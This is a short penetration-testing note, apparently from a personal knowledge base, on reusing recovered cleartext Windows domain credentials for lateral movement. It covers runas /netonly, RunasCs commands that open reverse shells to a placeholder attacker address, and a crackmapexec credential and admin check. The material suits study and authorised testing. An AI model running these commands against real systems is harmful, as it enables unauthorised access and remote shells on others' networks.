---
title: NetNTLMv2
draft: false
tags:
  - windows
  - active-directory
  - lateral-movement
  - active
---
 
When we have recovered **cleartext credentials** for a domain user (for example after [[AD Password Spraying]] or cracking a captured hash) but have no interactive session as that user, we can spawn a process in their security context locally using `runas`. The new process authenticates to remote hosts over the network using NetNTLMv2, letting us reuse the credentials for lateral movement without needing the user's NTLM hash.

> [!Requirements]
> Host with NetNTLMv2 authentication enabled on a host for the target user.

This command is to be able to execute commands in the context of a different user:
```
runas /netonly /user:DOMAIN_CN\USER "powershell.exe"
*enter password*
```

> [!Important]
> To enumerate if we can use the credentials of the target user, we can use `winPEASx64.exe`

If the password prompt is not interactive, upload runascs.exe to the target and execute:
```
.\runascs.exe USER PASSWORD COMMAND
```

Reverse shell:
```
.\runascs.exe USER PASSWORD powershell.exe -r LOCAL_IP:LOCAL_PORT
```

> [!Note]
> [RunasCs](https://github.com/antonioCoco/RunasCs) is an open source `runas` replacement that does not require an interactive console and supports redirecting stdin/stdout over a network socket. The `--logon-type` flag (`-l`) controls the logon type: `8` (NetworkCleartext) is the most reliable for reusing credentials remotely, `2` (Interactive) maps to a normal logon.

```
.\RunasCs.exe USER PASSWORD cmd.exe -l 8 -r LOCAL_IP:LOCAL_PORT
```

# Verify the credentials work
Before pivoting, confirm the account is valid and whether it has admin rights on a target:
```bash
$ crackmapexec smb TARGET_IP -u USER -p PASSWORD   # look for (Pwn3d!) for local admin
```

# Related notes
- [[Pass the Hash (PtH)]] — when we only have the NTLM hash instead of the cleartext password
- [[AD Password Spraying]] — common source of the cleartext credentials reused here
- [[Pass the Ticket (PtT)]]